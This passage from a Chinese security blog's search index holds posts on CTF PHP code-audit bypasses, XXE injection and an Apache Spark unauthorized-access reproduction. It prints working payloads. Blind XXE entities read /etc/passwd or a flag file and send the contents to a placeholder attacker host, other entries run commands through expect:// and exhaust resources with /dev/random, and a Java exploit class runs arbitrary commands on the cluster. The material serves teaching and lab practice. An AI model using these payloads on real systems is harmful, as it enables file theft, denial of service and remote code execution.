代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"3 空白符相关 \u003c?php highlight_file(__FILE__); include \"flag.php\"; $info = \"\"; $req = []; ini_set(\"display_error\", false); error_report(0); if(!isset($_GET[\"number\"])) { die(\"have a fun!\"); } foreach([$_GET, $_POST] as $global_var) { foreach($global_var as key =\u003e $value) { $value = trim($value); is_string($value) \u0026\u0026 $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i \u003c $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } if(is_numeric($_REQUEST['number'])) { $info = \"Sorry, you can not input a number!\"; } else if($req['number'] != strval(intval($req['number']))) { $info = \"number must be equal to it\\'s integer!!\"; } else { $value1 = intval($req[\"number\"]); $value2 = intval(strrev($req[\"number\"])); if($value1 != $value2) { $info = \"no, this is not a palindrome number\"; } else { if(is_palindrome_number($req[\"number\"])) { $info = \"nice! {$value1}is a palindrome number!\" } else { $info = $flag; } } } echo $info; ?\u003e ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"3.1 intval 函数 成功返回 var 的 interger 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1 最大的值取决于操作系统 32 位操作系统最大有符号整型范围是 -2147483648 到 2147483647 64 位系统上，最大有符号的整数的值为 9223372036854775807 \u003c?php echo intval(42); // 42 echo intval(4.2); // 4 echo intval('42'); // 42 echo intval('+42'); // 42 echo intval('-42'); // -42 echo intval(042); // 34 echo intval('042'); // 42 echo intval(1e10); // 1000000000 echo intval('1e10'); // 1 echo intval(0x1A); // 26 echo intval(42000000); // 42000000 echo intval(420000000000000000000); // 0 echo intval('420000000000000000000'); // 2147483647 echo intval(42, 8); // 42 echo intval('42', 8); // 34 echo intval(array()); // 0 echo intval(array('foo', 'bar')); // 1 ?\u003e ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:1","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"3.2 浮点数精度 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:2","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"3.3 is_numeric 函数 当传入的字符串中含有空格 、\\t \\r \\n \\v \\f 等特殊符号，返回结果仍为 true ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:3","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"3.3 trim 函数 函数对比： 源码 trim 去除\\t\\n\\r\\0\\x0B is_numeric、intval 跳过\\t\\n\\r\\f\\v payload : ?number=%00%0c121 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:4","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"4 伪随机数相关 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:0","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"4.1 mt_rand 函数 如果我们自己指定范围，如果过小是很容易被爆破出来的，因此大多数实际应用中都是不指定范围，mt_rand() 函数默认范围是 0 到 mt_getrandmax() 之间的伪随机数 相同的种子生成的随机数是相同的，所以可以通过逆推 mt_rand 的种子来获得同页面的另一个 rand 的值 工具：php_mt_seed ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:1","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"4.2 DEMO \u003c?php highlight_file(__FILE__); include \"flag.php\"; error_reporting(0); echo \"please input a rand num!\"; function create_password($pw_length = 4) { $randpwd = \"\"; for ($i = 0; $i \u003c $pw_length; $i++) { $randpwd .= mt_rand(); } return $randpwd; } session_start(); // var_dump($_SESSION); $time = time(); mt_srand($time); $pwd = create_password(); // var_dump(($_SESSION['userLogin'] == $_GET['login'])); // echo $pwd . '||'; // echo $_GET['pwd']; // var_dump($pwd == $_GET['pwd']); if ($pwd == $_GET['pwd']) { echo \"first\"; //NULL == NULL 即可绕过，即保持第一次登录 if ($_SESSION['userLogin'] == $_GET['login']) { echo \"Nice, you get the flag it is\" . $flag; } } else { echo \"Wrong!\"; } $_SESSION['userLogin'] = create_password(32) . rand(); ?\u003e Payload： \u003c?php function create_password($pw_length=4) { $randpwd = \"\"; for ($i=0; $i \u003c $pw_length; $i++) { $randpwd .= mt_rand(); } return $randpwd; } mt_srand(time()); $pwd = create_password(); $url = \"http://xxx/mt_rand.php?pwd=\". $pwd; system('curl'. $url); echo $pwd; ?\u003e ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:2","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"5 其它函数 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:0","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"5.1 运算符优先级 \u003c?php highlight_file(__FILE); include \"flag.php\"; $a = 'test'; $b = 'test2'; $a = $_GET['a']; $b = $_GET['b']; // 运算符优先级，= 号 \u003e and 号，即($c = is_numeric($a)) and is_numeric($b) $c = is_numeric($a) and is_numeric($b); if($c) { if(is_numeric($a)) { if(is_numeric($b)) { echo \"is_numeric(b)\"; } else { echo $flag; } } else { echo \"is_numeric(a) error\"; } } else { print \"is_numeric(a) and is_numeric(b) error !\"; } ?\u003e payload：url?a=123 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:1","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"5.2 parase_url 如果指定了 component 参数， parse_url() 返回一个 string （或在指定为 PHP_URL_PORT 时返回一个 integer）而不是 array。如果 URL 中指定的组成部分不存在，将会返回 NULL。 Demo： \u003c?php include \"flag.php\"; $number1 = rand(1, 100000000000000); $number2 = rand(1, 100000000000); $number3 = rand(1, 100000000); $url = urldecode($_SERVER['REQUEST_URI']); // 利用 http:/// 使得 parse_url 返回 false，绕过正则表达式。 $url = parse_url($url, PHP_URL_QUERY); if (preg_match(\"/_/i\", $url)) { die(\"..1\"); } if (preg_match(\"/0/i\", $url)) { die(\"..2\"); } if (preg_match(\"/\\w+/i\", $url)) { die(\"..3\"); } if(isset($_GET['_']) \u0026\u0026 !empty($_GET['_'])) { $control = $_GET['_']; // in_array()函数漏洞：var_dump(0 == \"a\") =\u003e true if (!in_array($control, , array(0, $number1))) { die(\"fail1\"); } if (!in_array($control, , array(0, $number2))) { die(\"fail2\"); } if (!in_array($control, , array(0, $number3))) { die(\"fail3\"); } echo $flag; } show_source(__FILE__); ?\u003e Payload：http:///url?_=a 或 http:///url?.=a ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:2","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"6 escapeshellarg 和 escapeshellcmd ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:0","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"6.1 相关函数 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:1","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"6.2 Demo \u003c?php highlight_file(__FILE__); function waf($a){ foreach($a as $key =\u003e $value){ if(preg_match('/flag/i',$key)){ exit('are you a hacker'); } } } foreach(array('_POST', '_GET', '_COOKIE') as $__R) { if($$__R) { foreach($$__R as $__k =\u003e $__v) { if(isset($$__k) \u0026\u0026 $$__k == $__v) unset($$__k); } } } if($_POST) { waf($_POST);} if($_GET) { waf($_GET); } if($_COOKIE) { waf($_COOKIE);} if($_POST) extract($_POST, EXTR_SKIP); if($_GET) extract($_GET, EXTR_SKIP); // var_dump($_GET); // echo '\u003cbr\u003e\u003c/br\u003e'; if(isset($_GET['flag'])){ if($_GET['flag'] === $_GET['hongri']){ exit('error'); } if(md5($_GET['flag'] ) == md5($_GET['hongri'])){ $url = $_GET['url']; $urlInfo = parse_url($url); var_dump($urlInfo); // echo '\u003cbr\u003e\u003c/br\u003e'; if(!(\"http\" === strtolower($urlInfo[\"scheme\"]) || \"https\"===strtolower($urlInfo[\"scheme\"]))){ die( \"scheme error!\"); } $url = escapeshellarg($url); $url = escapeshellcmd($url); echo $url; system(\"curl \".$url); } } ?\u003e ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:2","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试"],"content":"XXE 漏洞相关漏洞相关","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"XXE 漏洞相关 ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1 定义与原理 ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.1 XXE 定义 XXE 漏洞全称 XML External Entity Injection，XML 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、内网端口扫描、攻击内网网站发起 dos 攻击等危害。 ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:1","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.2 XML 基础 1.2.1 XML 定义 文档标记语言，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素 \u003c!-- 声明信息 --\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003cscores\u003e \u003cstudent id=\"s1\"\u003e \u003cname\u003ehacker\u003c/name\u003e \u003ccourse\u003eC++\u003c/course\u003e \u003cscore\u003e95\u003c/score\u003e \u003c/student\u003e \u003c/scores\u003e 1.2.2 DTD 定义 DTD - Document Type Definition 文档类型定义，利用 DTD 定义 XML 文档中有哪些模块以及模块中有哪些内容（类比强类型语言）。 在 XML 文件中定义内部 DTD： \u003c!-- 声明信息 --\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!-- 定义内部 DTD --\u003e \u003c!DOCTYPE scores [ \u003c!ELEMENT scores (student+) \u003e \u003c!ELEMENT student (name, course, score) \u003e \u003c!ATTLIST student id CDATA #REQUIRED \u003e \u003c!ELEMENT course (#PCDATA)\u003e \u003c!ELEMENT name (#PCDATA)\u003e \u003c!ELEMENT score (#PCDATA)\u003e ]\u003e \u003cscores\u003e \u003cstudent id=\"s1\"\u003e \u003cname\u003ehacker\u003c/name\u003e \u003ccourse\u003eC++\u003c/course\u003e \u003cscore\u003e90\u003c/score\u003e \u003c/student\u003e \u003c/scores\u003e PCDATA 的意思是被解析的字符数据 引用外部实体： \u003c!-- 声明信息 --\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!-- 引用外部 DTD --\u003e \u003c!DOCTYPE scores SYSTEM \"scores.dtd\"\u003e \u003cscores\u003e \u003cstudent id=\"s1\"\u003e \u003cname\u003ehacker\u003c/name\u003e \u003ccourse\u003eC++\u003c/course\u003e \u003cscore\u003e90\u003c/score\u003e \u003c/student\u003e \u003c/scores\u003e scores.dtd 文件内容： \u003c!-- 声明信息 --\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!ELEMENT scores (student+) \u003e \u003c!ELEMENT student (name, course, score) \u003e \u003c!ATTLIST student id CDATA #REQUIRED \u003e \u003c!ELEMENT course (#PCDATA)\u003e \u003c!ELEMENT name (#PCDATA)\u003e \u003c!ELEMENT score (#PCDATA)\u003e ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:2","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2 XML 实体注入 在 DTD 中可以定义实体（类比编程语言中的常量），定义的实体可以在 xml 中引用，经过 XML 解析器解析后，实体就会被替换成定义的文本内容。 引用实体的格式为：\u0026实体名; 当引用了一个外部实体后，就可能存在一定的问题，下面的代码是一个引用外部实体的例子： \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE demo[ \u003c!ENTITY content SYSTEM \"file:///etc/password\"\u003e ]\u003e \u003cdemo\u003e\u0026content;\u003c/demo\u003e 因此，XML 漏洞主要是由于外部实体可以解析外部文件的特性。 参数实体： 参数实体只用于 DTD 和文档的内部子集中，XML 的规范定义中，只有在 DTD 中才能引用参数实体。参数实体的声明和引用都是以百分号 %。并且参数实体的引用在 DTD 是理解解析的，替换文本将变成 DTD 的一部分。该类型的实体用“％”字符（或十六进制编码的 ％）。 参数实体只能用在 DTD 中。 \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE root[ \u003c!ELEMENT root (message) \u003e \u003c!ENTITY % param1 \"\u003c!ENTITY internal 'http://xxx.com'\u003e\"\u003e %param1; ]\u003e \u003croot\u003e \u003cmessage\u003e\u0026internal;\u003c/message\u003e \u003c/root\u003e 参数实体常用在无回显的 XXE 中。 ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"3 XXE 危害 ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:0","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"3.1 读取任意文件 3.1.1 有回现 以 vulhub 上的靶场为例： payload： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ELEMENT name ANY \u003e \u003c!ENTITY data SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u003croot\u003e \u003cname\u003e\u0026data;\u003c/name\u003e \u003c/root\u003e 3.1.2 无回显 blind xxe 的原理很简单，就是建立一条带外信道提取数据，利用外部实体中的 URL 发出访问，利用攻击者的公网主机接收数据，从而达到数据的读取。 攻击者向存在 XXE 漏洞的服务器发送了一条 payload，这个 payload 的功能是查找服务器本机某个文件，然后向攻击者的服务器请求一条 URL 请求，获取这个恶意的 DTD 内容，当存在漏洞的服务器读取到这个 DTD 的内容为把一开始自己找的本地的那个文件内容做为参数去传递给攻击者服务器的这个 php 文件，这个 php 的文件是把获取的这个参数本地保存下来，从而，就这样的得到了回显的内容。 payload： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY\u003e \u003c!ENTITY % evil SYSTEM \"file:///etc/passwd\"\u003e \u003c!-- 或者以伪协议编码形式读取 php://filter/read=convert.base64-encode/resource=conf.php --\u003e \u003c!ENTITY % xxe SYSTEM \"http://IP/dtd.xml\"\u003e %xxe; %all; ]\u003e \u003cfoo\u003e\u0026send;\u003c/foo\u003e dtd.xml \u003c!ENTITY % all \"\u003c!ENTITY send SYSTEM 'http://IP/receive.php?p=%evil;'\u003e\"\u003e 在内部 DTD 里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser 会报错： PEReferences forbidden in internal subset 。 ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:1","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"3.2 执行命令 需要安装 expect 扩展 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE xxe [ \u003c!ELEMENT name ANY \u003e \u003c!ENTITY xxe SYSTEM \"expect://id\"\u003e]\u003e \u003cxxe\u003e \u003cname\u003e\u0026xxe;\u003c/name\u003e \u003c/xxe\u003e ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:2","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"3.3 拒绝服务攻击 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE xxe [ \u003c!ELEMENT name ANY \u003e \u003c!ENTITY xxe SYSTEM \"file:///dev/random\"\u003e]\u003e \u003cxxe\u003e \u003cname\u003e\u0026xxe;\u003c/name\u003e \u003c/xxe\u003e ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:3","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"4 CTF 题目 ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:0","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"4.1 DEMO 1 http://web.jarvisoj.com:9882 题目描述：请获取 /home/ctf/flag.txt 下的内容 访问 web，点击 Go，在 burpsuite 中抓到请求包 POST /api/v1.0/try HTTP/1.1 Host: web.jarvisoj.com:9882 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 36 Origin: http://web.jarvisoj.com:9882 Connection: close Referer: http://web.jarvisoj.com:9882/ {\"search\":\"type sth!\",\"value\":\"own\"} 将 Content-Type 改为 application/xml，提交 poc： ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:1","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"4.2 DEMO 2 源码： \u003c?php function __autoload($cls) { include $cls; } class Black { public function __construct($string, $default, $keyword, $store) { if ($string) ini_set(\"highlight.string\", \"#0d0d0d\"); if ($default) ini_set(\"highlight.default\", \"#0d0d0d\"); if ($keyword) ini_set(\"highlight.keyword\", \"#0d0d0d\"); if ($store) { setcookie('theme', \"Black-\".$string.\"-\".$default.\"-\".$keyword, 0, '/'); } } } class Green { public function __construct($string, $default, $keyword, $store) { if ($string) ini_set(\"highlight.string\", \"#00fb00\"); if ($default) ini_set(\"highlight.default\", \"#00fb00\"); if ($keyword) ini_set(\"highlight.keyword\", \"#00fb00\"); if ($store) { setcookie('theme', \"Green-\".$string.\"-\".$default.\"-\".$keyword, 0, '/'); } } } if ($_=@$_GET['theme']) { if (in_array($_, [\"Black\", \"Green\"])) { if (@class_exists($_)) { ($string = @$_GET['string']) || $string = false; ($default = @$_GET['default']) || $default = false; ($keyword = @$_GET['keyword']) || $keyword = false; new $_($string, $default, $keyword, @$_GET['store']); } } } else if ($_=@$_COOKIE['theme']) { $args = explode('-', $_); if (class_exists($args[0])) { new $args[0]($args[1], $args[2], $args[3], ''); } } else if ($_=@$_GET['info']) { phpinfo(); } highlight_file(__FILE__); 可以看到在根据 cookie 加载主题类的地方没有判断 cookie 是否被篡改，导致我们可以实例化任意类 new $args[0]($args[1], $args[2], $args[3], '');。 寻找内置的 php 原生类，且该类的实例化参数要与 $args[0]($args[1], $args[2], $args[3], '') 相对应，类 SimpleXMLElement 符合上述要求。 因此可以通过 Blind XXE 读取 /flag.php 文件 payload： Cookie:theme=SimpleXMLElement-http://ip/xxe.xml-2-true 远端 xxe.xml \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\"\u003e \u003c!ENTITY % remote SYSTEM \"http://IP/xxe.dtd\"\u003e %remote; %all; ]\u003e \u003cfoo\u003e\u0026send;\u003c/foo\u003e xxe.dtd \u003c!ENTITY % all \"\u003c!ENTITY send SYSTEM 'http://IP/receive.php?file=%file;'\u003e\"\u003e ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:2","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"5 防御 使用开发语言提供的禁用外部实体的方法 PHP libxml 版本低于 2.9.1 默认开启 \u003c?php libxml_disable_entity_loader (false); ?\u003e 过滤用户提交的 XML 数据，如关键字 SYSTEM、 PUBLIC 等。 ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:5:0","tags":["常用","渗透测试","XXE"],"title":"XXE 漏洞相关","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["漏洞复现","vulhub"],"content":"Apache Spark 未授权访问漏洞","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","tags":["漏洞复现","vulhub","Spark"],"title":"Apache Spark 未授权访问漏洞","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"Apache Spark 未授权访问漏洞 Apache Spark 是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动 ACL（访问控制），我们将可以在集群中执行任意代码。 ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":["漏洞复现","vulhub","Spark"],"title":"Apache Spark 未授权访问漏洞","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"漏洞环境 执行如下命令，将以 standalone 模式启动一个 Apache Spark 集群，集群里有一个 master 与一个 slave： docker-compose up -d 环境启动后，访问http://your-ip:8080即可看到 master 的管理页面，访问http://your-ip:8081即可看到 slave 的管理页面。 ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["漏洞复现","vulhub","Spark"],"title":"Apache Spark 未授权访问漏洞","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"漏洞利用 该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。 提交方式有两种： 利用REST API 利用 submissions 网关（集成在 7077 端口中） 应用可以是 Java 或 Python，就是一个最简单的类 import java.io.BufferedReader; import java.io.InputStreamReader; public class Exploit { public static void main(String[] args) throws Exception { String[] cmds = args[0].split(\",\"); for (String cmd : cmds) { System.out.println(cmd); System.out.println(executeCommand(cmd.trim())); System.out.println(\"==============================================\"); } } // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/ private static String executeCommand(String command) { StringBuilder output = new StringBuilder(); try { Process p = Runtime.getRuntime().exec(command); p.waitFor(); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { output.append(line).append(\"\\n\"); } } catch (Exception e) { e.printStackTrace(); } return output.toString(); } } 将其编译成 JAR，放在任意一个 HTTP 或 FTP 上: https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":["漏洞复现","vulhub","Spark"],"title":"Apache Spark 